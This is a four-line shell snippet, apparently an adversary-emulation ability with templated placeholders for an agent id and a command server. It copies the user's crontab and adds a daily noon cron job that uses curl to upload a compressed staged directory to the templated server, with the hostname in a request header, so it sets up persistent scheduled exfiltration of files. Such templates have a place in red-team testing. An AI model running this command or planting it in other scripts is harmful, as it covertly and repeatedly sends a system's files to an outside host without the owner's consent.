crontab -l > /tmp/origcron;
crontab -l > /tmp/mycron;
echo "0 12 * * * curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload" >> /tmp/mycron;
crontab /tmp/mycron;
